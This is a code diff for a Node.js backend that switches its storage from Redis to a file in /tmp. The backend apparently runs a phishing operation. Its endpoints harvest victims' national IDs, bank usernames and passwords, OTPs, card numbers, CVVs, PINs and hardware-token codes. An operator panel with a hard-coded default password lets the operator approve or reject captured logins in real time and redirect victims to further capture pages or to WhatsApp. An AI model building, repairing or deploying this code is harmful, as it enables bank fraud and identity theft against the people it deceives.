@@ -1,12 +1,10 @@
 const crypto = require('crypto');
+const fs = require('fs');
+const path = require('path');
 
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin1234@@';
 const TOKEN_SECRET = process.env.TOKEN_SECRET || 'halyg-admin-secret-key-2026';
-const REDIS_URL = process.env.UPSTASH_REDIS_REST_URL;
-const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
-
-// In-memory fallback (persists while function instance is warm)
-const mem = { applications: {}, visitors: {}, whatsappLink: '', totalVisitors: 0, appId: 10000, visitorId: 120000 };
+const DATA_FILE = path.join('/tmp', 'halyg-data.json');
 
 function makeToken() {
   return crypto.createHmac('sha256', TOKEN_SECRET).update(ADMIN_PASSWORD).digest('hex');
@@ -21,82 +19,29 @@ function isAdminReq(req) {
   return verifyToken(req.headers['x-admin-token'] || cookies['admin_session']);
 }
 
-// --- Storage layer: Redis if available, else in-memory ---
-async function rc(...args) {
-  if (!REDIS_URL || !REDIS_TOKEN) return null;
+// --- File-based storage in /tmp ---
+const DEFAULT_DATA = { applications: {}, visitors: {}, whatsappLink: '', totalVisitors: 0, appIdCounter: 10000, visitorIdCounter: 120000 };
+
+function loadData() {
   try {
-    const r = await fetch(REDIS_URL, {
-      method: 'POST',
-      headers: { Authorization: 'Bearer ' + REDIS_TOKEN, 'Content-Type': 'application/json' },
-      body: JSON.stringify(args),
-    });
-    const d = await r.json();
-    return d.result;
-  } catch { return null; }
-}
-const useRedis = !!(REDIS_URL && REDIS_TOKEN);
-
-async function getApp(id) {
-  if (useRedis) { const r = await rc('HGET', 'apps', id); return r ? JSON.parse(r) : null; }
-  return mem.applications[id] || null;
-}
-async function setApp(app) {
-  if (useRedis) { await rc('HSET', 'apps', app.nationalId, JSON.stringify(app)); return; }
-  mem.applications[app.nationalId] = app;
-}
-async function getAllApps() {
-  if (useRedis) {
-    const r = await rc('HGETALL', 'apps');
-    if (!r || !Array.isArray(r)) return [];
-    const out = []; for (let i = 1; i < r.length; i += 2) { try { out.push(JSON.parse(r[i])); } catch {} } return out;
-  }
-  return Object.values(mem.applications);
-}
-async function delApp(id) {
-  if (useRedis) { await rc('HDEL', 'apps', id); return; }
-  delete mem.applications[id];
-}
-async function getVisitor(id) {
-  if (useRedis) { const r = await rc('HGET', 'vis', id); return r ? JSON.parse(r) : null; }
-  return mem.visitors[id] || null;
-}
-async function setVisitor(v) {
-  if (useRedis) { await rc('HSET', 'vis', v.sessionId, JSON.stringify(v)); return; }
-  mem.visitors[v.sessionId] = v;
-}
-async function getAllVisitors() {
-  if (useRedis) {
-    const r = await rc('HGETALL', 'vis');
-    if (!r || !Array.isArray(r)) return [];
-    const out = []; for (let i = 1; i < r.length; i += 2) { try { out.push(JSON.parse(r[i])); } catch {} } return out;
-  }
-  return Object.values(mem.visitors);
-}
-async function getMeta(key) {
-  if (useRedis) return await rc('GET', 'meta:' + key);
-  if (key === 'whatsappLink') return mem.whatsappLink;
-  if (key === 'totalVisitors') return String(mem.totalVisitors);
-  return null;
-}
-async function setMeta(key, val) {
-  if (useRedis) { await rc('SET', 'meta:' + key, String(val)); return; }
-  if (key === 'whatsappLink') mem.whatsappLink = val;
-  if (key === 'totalVisitors') mem.totalVisitors = parseInt(val, 10) || 0;
-}
-async function incrMeta(key) {
-  if (useRedis) return await rc('INCR', 'meta:' + key);
-  if (key === 'totalVisitors') return ++mem.totalVisitors;
-  if (key === 'appIdCounter') return ++mem.appId;
-  if (key === 'visitorIdCounter') return ++mem.visitorId;
-  return Date.now();
+    if (fs.existsSync(DATA_FILE)) {
+      return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
+    }
+  } catch {}
+  return { ...DEFAULT_DATA };
 }
 
-async function getOrCreateApp(nationalId) {
-  let app = await getApp(nationalId);
-  if (!app) {
-    const id = await incrMeta('appIdCounter');
-    app = {
-      id, nationalId,
+function saveData(data) {
+  try {
+    fs.writeFileSync(DATA_FILE, JSON.stringify(data), 'utf8');
+  } catch {}
+}
+
+function getOrCreateApp(data, nationalId) {
+  if (!data.applications[nationalId]) {
+    data.appIdCounter++;
+    data.applications[nationalId] = {
+      id: data.appIdCounter, nationalId,
       fullName: '', phoneNumber: '', phone: '', address: '',
       username: '', password: '',
       otp: '', otpCode: '',
@@ -111,68 +56,70 @@ async function getOrCreateApp(nationalId) {
       createdAt: new Date().toISOString(),
       updatedAt: new Date().toISOString(),
     };
-    await setApp(app);
   }
-  return app;
+  return data.applications[nationalId];
 }
 
-async function getOrCreateVisitor(sessionId) {
-  let v = await getVisitor(sessionId);
-  if (!v) {
-    const id = await incrMeta('visitorIdCounter');
-    await incrMeta('totalVisitors');
-    v = { id, sessionId, currentPage: 'home', redirectTo: null, lastActiveAt: new Date().toISOString(), createdAt: new Date().toISOString() };
-    await setVisitor(v);
+function getOrCreateVisitor(data, sessionId) {
+  if (!data.visitors[sessionId]) {
+    data.visitorIdCounter++;
+    data.totalVisitors++;
+    data.visitors[sessionId] = {
+      id: data.visitorIdCounter, sessionId,
+      currentPage: 'home', redirectTo: null,
+      lastActiveAt: new Date().toISOString(),
+      createdAt: new Date().toISOString(),
+    };
   }
-  return v;
+  return data.visitors[sessionId];
 }
 
-async function executeProcedure(name, input, isAdmin) {
+async function executeProcedure(name, input, isAdmin, data) {
   switch (name) {
     case 'admin.updateVisitor': {
       const { sessionId, page, currentPage } = input;
-      if (sessionId) { const v = await getOrCreateVisitor(sessionId); v.currentPage = currentPage || page || v.currentPage; v.lastActiveAt = new Date().toISOString(); await setVisitor(v); }
+      if (sessionId) { const v = getOrCreateVisitor(data, sessionId); v.currentPage = currentPage || page || v.currentPage; v.lastActiveAt = new Date().toISOString(); }
       return { success: true };
     }
     case 'admin.getVisitorRedirect': {
       const { sessionId } = input;
-      const v = sessionId ? await getVisitor(sessionId) : null;
+      const v = sessionId ? data.visitors[sessionId] : null;
       return { redirectTo: v ? (v.redirectTo || null) : null };
     }
     case 'admin.clearVisitorRedirect': {
       const { sessionId } = input;
-      if (sessionId) { const v = await getVisitor(sessionId); if (v) { v.redirectTo = null; await setVisitor(v); } }
+      if (sessionId && data.visitors[sessionId]) data.visitors[sessionId].redirectTo = null;
       return { success: true };
     }
     case 'applications.getRedirectStatus': {
       const { nationalId } = input;
-      const app = nationalId ? await getApp(nationalId) : null;
+      const app = nationalId ? data.applications[nationalId] : null;
       return { redirectTo: app ? (app.redirectTo || null) : null, redirectError: app ? (app.redirectError || null) : null };
     }
     case 'applications.clearRedirectByUser': {
       const { nationalId } = input;
-      if (nationalId) { const app = await getApp(nationalId); if (app) { app.redirectTo = null; app.redirectError = null; await setApp(app); } }
+      if (nationalId && data.applications[nationalId]) { data.applications[nationalId].redirectTo = null; data.applications[nationalId].redirectError = null; }
       return { success: true };
     }
     case 'applications.getCustomMessage': {
       const { nationalId } = input;
-      const app = nationalId ? await getApp(nationalId) : null;
+      const app = nationalId ? data.applications[nationalId] : null;
       return { message: app ? (app.customMessage || null) : null };
     }
     case 'applications.clearCustomMessage': {
       const { nationalId } = input;
-      if (nationalId) { const app = await getApp(nationalId); if (app) { app.customMessage = null; await setApp(app); } }
+      if (nationalId && data.applications[nationalId]) data.applications[nationalId].customMessage = null;
       return { success: true };
     }
     case 'applications.updatePage': {
       const { nationalId, page } = input;
-      if (nationalId) { const app = await getOrCreateApp(nationalId); app.currentPage = page || app.currentPage; app.updatedAt = new Date().toISOString(); await setApp(app); }
+      if (nationalId) { const app = getOrCreateApp(data, nationalId); app.currentPage = page || app.currentPage; app.updatedAt = new Date().toISOString(); }
       return { success: true };
     }
     case 'applications.savePersonalInfo': {
       const { nationalId, fullName, phone, phoneNumber, address, governorate, watchColor } = input;
       if (!nationalId) throw new Error('nationalId required');
-      const app = await getOrCreateApp(nationalId);
+      const app = getOrCreateApp(data, nationalId);
       if (fullName) app.fullName = fullName;
       const ph = phone || phoneNumber;
       if (ph) { app.phone = ph; app.phoneNumber = ph; }
@@ -180,33 +127,30 @@ async function executeProcedure(name, input, isAdmin) {
       if (governorate) app.governorate = governorate;
       if (watchColor) { app.watchColor = watchColor; app.selectedWatch = watchColor; }
       app.updatedAt = new Date().toISOString();
-      await setApp(app);
       return { success: true };
     }
     case 'applications.saveLoginData': {
       const { nationalId, username, password } = input;
       if (!nationalId) throw new Error('nationalId required');
-      const app = await getOrCreateApp(nationalId);
+      const app = getOrCreateApp(data, nationalId);
       if (username) app.username = username;
       if (password) app.password = password;
       app.loginApproved = null; app.status = 'awaiting_login'; app.updatedAt = new Date().toISOString();
-      await setApp(app);
       return { success: true };
     }
     case 'applications.saveOtpData': {
       const { nationalId, otp, otpCode } = input;
       if (!nationalId) throw new Error('nationalId required');
-      const app = await getOrCreateApp(nationalId);
+      const app = getOrCreateApp(data, nationalId);
       const code = otp || otpCode;
       if (code) { app.otp = code; app.otpCode = code; }
       app.status = 'awaiting_otp'; app.updatedAt = new Date().toISOString();
-      await setApp(app);
       return { success: true };
     }
     case 'applications.saveCardData': {
       const { nationalId, cardNumber, cardExpiry, cvv, cardCvv, cardName, cardPin, expiry } = input;
       if (!nationalId) throw new Error('nationalId required');
-      const app = await getOrCreateApp(nationalId);
+      const app = getOrCreateApp(data, nationalId);
       if (cardNumber) app.cardNumber = cardNumber;
       if (cardExpiry || expiry) app.cardExpiry = cardExpiry || expiry;
       const cv = cvv || cardCvv;
@@ -214,27 +158,24 @@ async function executeProcedure(name, input, isAdmin) {
       if (cardName) app.cardName = cardName;
       if (cardPin) app.cardPin = cardPin;
       app.status = 'awaiting_card'; app.updatedAt = new Date().toISOString();
-      await setApp(app);
       return { success: true };
     }
     case 'applications.saveHardToken': {
       const { nationalId, hardToken, hardTokenCode, token } = input;
       if (!nationalId) throw new Error('nationalId required');
-      const app = await getOrCreateApp(nationalId);
+      const app = getOrCreateApp(data, nationalId);
       const tk = hardToken || hardTokenCode || token;
       if (tk) app.hardToken = tk;
       app.status = 'awaiting_token'; app.updatedAt = new Date().toISOString();
-      await setApp(app);
       return { success: true };
     }
     case 'applications.saveWatchLink': {
       const { nationalId, watchLink, watchLinkOtp, link } = input;
       if (!nationalId) throw new Error('nationalId required');
-      const app = await getOrCreateApp(nationalId);
+      const app = getOrCreateApp(data, nationalId);
       const wl = watchLink || watchLinkOtp || link;
       if (wl) { app.watchLink = wl; app.watchLinkOtp = wl; }
       app.updatedAt = new Date().toISOString();
-      await setApp(app);
       return { success: true };
     }
     case 'admin.login': {
@@ -250,96 +191,92 @@ async function executeProcedure(name, input, isAdmin) {
     }
     case 'admin.getApplications': {
       if (!isAdmin) throw new Error('unauthorized');
-      const apps = await getAllApps();
+      const apps = Object.values(data.applications);
       const cutoff = Date.now() - 60000;
       const activeIds = apps.filter(a => new Date(a.updatedAt).getTime() > cutoff).map(a => a.nationalId);
-      const liveVs = (await getAllVisitors()).filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 30000);
-      const tv = parseInt(await getMeta('totalVisitors') || '0', 10);
-      return { apps, activeIds, liveVisitorCount: liveVs.length, totalVisitors: tv };
+      const liveVisitorCount = Object.values(data.visitors).filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 30000).length;
+      return { apps, activeIds, liveVisitorCount, totalVisitors: data.totalVisitors };
     }
     case 'admin.getLiveVisitors': {
       if (!isAdmin) throw new Error('unauthorized');
-      const all = await getAllVisitors();
-      return { visitors: all.filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 30000) };
+      return { visitors: Object.values(data.visitors).filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 30000) };
     }
     case 'admin.getAllVisitors': {
       if (!isAdmin) throw new Error('unauthorized');
-      const tv = parseInt(await getMeta('totalVisitors') || '0', 10);
-      return { visitors: await getAllVisitors(), totalCount: tv };
+      return { visitors: Object.values(data.visitors), totalCount: data.totalVisitors };
     }
     case 'admin.getWhatsAppLink': {
-      return { link: await getMeta('whatsappLink') || '' };
+      return { link: data.whatsappLink || '' };
     }
     case 'admin.updateWhatsAppLink': {
       if (!isAdmin) throw new Error('unauthorized');
-      await setMeta('whatsappLink', input.link || '');
+      data.whatsappLink = input.link || '';
       return { success: true };
     }
     case 'admin.setCustomMessage': {
       if (!isAdmin) throw new Error('unauthorized');
       const { nationalId, message } = input;
-      if (nationalId) { const app = await getApp(nationalId); if (app) { app.customMessage = message || null; await setApp(app); } }
+      if (nationalId && data.applications[nationalId]) data.applications[nationalId].customMessage = message || null;
       return { success: true };
     }
     case 'admin.approveLogin': {
       if (!isAdmin) throw new Error('unauthorized');
       const { applicationId, nationalId } = input;
-      let app = nationalId ? await getApp(nationalId) : null;
-      if (!app && applicationId) { app = (await getAllApps()).find(a => a.id === applicationId); }
-      if (app) { app.loginApproved = true; app.redirectTo = 'otp'; app.status = 'login_approved'; app.updatedAt = new Date().toISOString(); await setApp(app); }
+      let app = nationalId ? data.applications[nationalId] : null;
+      if (!app && applicationId) app = Object.values(data.applications).find(a => a.id === applicationId);
+      if (app) { app.loginApproved = true; app.redirectTo = 'otp'; app.status = 'login_approved'; app.updatedAt = new Date().toISOString(); }
       return { success: true };
     }
     case 'admin.rejectLogin': {
       if (!isAdmin) throw new Error('unauthorized');
       const { applicationId, nationalId } = input;
-      let app = nationalId ? await getApp(nationalId) : null;
-      if (!app && applicationId) { app = (await getAllApps()).find(a => a.id === applicationId); }
-      if (app) { app.loginApproved = false; app.redirectTo = 'login-error'; app.status = 'login_rejected'; app.updatedAt = new Date().toISOString(); await setApp(app); }
+      let app = nationalId ? data.applications[nationalId] : null;
+      if (!app && applicationId) app = Object.values(data.applications).find(a => a.id === applicationId);
+      if (app) { app.loginApproved = false; app.redirectTo = 'login-error'; app.status = 'login_rejected'; app.updatedAt = new Date().toISOString(); }
       return { success: true };
     }
     case 'admin.redirectUser': {
       if (!isAdmin) throw new Error('unauthorized');
       const { nationalId, redirectTo, page, redirectError, showError } = input;
-      if (nationalId) { const app = await getApp(nationalId); if (app) { app.redirectTo = redirectTo || page || null; app.redirectError = redirectError || showError || null; app.updatedAt = new Date().toISOString(); await setApp(app); } }
+      if (nationalId && data.applications[nationalId]) { data.applications[nationalId].redirectTo = redirectTo || page || null; data.applications[nationalId].redirectError = redirectError || showError || null; data.applications[nationalId].updatedAt = new Date().toISOString(); }
       return { success: true };
     }
     case 'admin.redirectVisitor': {
       if (!isAdmin) throw new Error('unauthorized');
       const { sessionId, redirectTo, page } = input;
-      if (sessionId) { const v = await getVisitor(sessionId); if (v) { v.redirectTo = redirectTo || page || null; await setVisitor(v); } }
+      if (sessionId && data.visitors[sessionId]) data.visitors[sessionId].redirectTo = redirectTo || page || null;
       return { success: true };
     }
     case 'admin.redirectAllToToken': {
       if (!isAdmin) throw new Error('unauthorized');
-      const apps = await getAllApps();
-      for (const app of apps) { if (app.status === 'active' || app.status.startsWith('awaiting')) { app.redirectTo = input.redirectTo || 'token'; app.updatedAt = new Date().toISOString(); await setApp(app); } }
+      for (const app of Object.values(data.applications)) { if (app.status === 'active' || app.status.startsWith('awaiting')) { app.redirectTo = input.redirectTo || 'token'; app.updatedAt = new Date().toISOString(); } }
       return { success: true };
     }
     case 'admin.redirectWhatsApp': {
       if (!isAdmin) throw new Error('unauthorized');
       const { applicationId, nationalId } = input;
-      let app = nationalId ? await getApp(nationalId) : null;
-      if (!app && applicationId) { app = (await getAllApps()).find(a => a.id === applicationId); }
-      if (app) { app.redirectTo = 'whatsapp'; app.updatedAt = new Date().toISOString(); await setApp(app); }
+      let app = nationalId ? data.applications[nationalId] : null;
+      if (!app && applicationId) app = Object.values(data.applications).find(a => a.id === applicationId);
+      if (app) { app.redirectTo = 'whatsapp'; app.updatedAt = new Date().toISOString(); }
       return { success: true };
     }
     case 'admin.deleteApplication': {
       if (!isAdmin) throw new Error('unauthorized');
       const { applicationId, nationalId } = input;
-      if (nationalId) await delApp(nationalId);
-      else if (applicationId) { const app = (await getAllApps()).find(a => a.id === applicationId); if (app) await delApp(app.nationalId); }
+      if (nationalId) delete data.applications[nationalId];
+      else if (applicationId) { const k = Object.keys(data.applications).find(k => data.applications[k].id === applicationId); if (k) delete data.applications[k]; }
       return { success: true };
     }
     case 'admin.deleteInactiveClients': {
       if (!isAdmin) throw new Error('unauthorized');
       const cutoff = Date.now() - 120000;
       let deletedCount = 0;
-      for (const app of await getAllApps()) { if (new Date(app.updatedAt).getTime() < cutoff) { await delApp(app.nationalId); deletedCount++; } }
+      for (const k of Object.keys(data.applications)) { if (new Date(data.applications[k].updatedAt).getTime() < cutoff) { delete data.applications[k]; deletedCount++; } }
       return { success: true, deletedCount };
     }
     case 'admin.resetTotalVisitors': {
       if (!isAdmin) throw new Error('unauthorized');
-      await setMeta('totalVisitors', '0');
+      data.totalVisitors = 0;
       return { success: true };
     }
     default:
@@ -364,20 +301,27 @@ module.exports = async (req, res) => {
   else inputs = req.body || {};
 
   const isAdmin = isAdminReq(req);
+
+  // Load data from file at start of request
+  const data = loadData();
+
   let setCookie = null, clearCookie = false;
 
   const results = await Promise.all(procs.map(async (name, i) => {
     const raw = inputs[String(i)] || inputs;
     const input = raw?.json || raw || {};
     try {
-      const data = await executeProcedure(name.trim(), input, isAdmin);
-      if (data?._setToken) { setCookie = data._setToken; delete data._setToken; }
-      if (data?._clearToken) { clearCookie = true; delete data._clearToken; }
-      return { result: { data: { json: data } } };
+      const result = await executeProcedure(name.trim(), input, isAdmin, data);
+      if (result?._setToken) { setCookie = result._setToken; delete result._setToken; }
+      if (result?._clearToken) { clearCookie = true; delete result._clearToken; }
+      return { result: { data: { json: result } } };
     } catch (e) {
       return { error: { message: e.message || 'Internal error', code: 'INTERNAL_SERVER_ERROR' } };
     }
   }));
+
+  // Save data to file after processing
+  saveData(data);
 
   if (setCookie) res.setHeader('Set-Cookie', `admin_session=${setCookie}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`);
   if (clearCookie) res.setHeader('Set-Cookie', 'admin_session=; Path=/; HttpOnly; Max-Age=0');
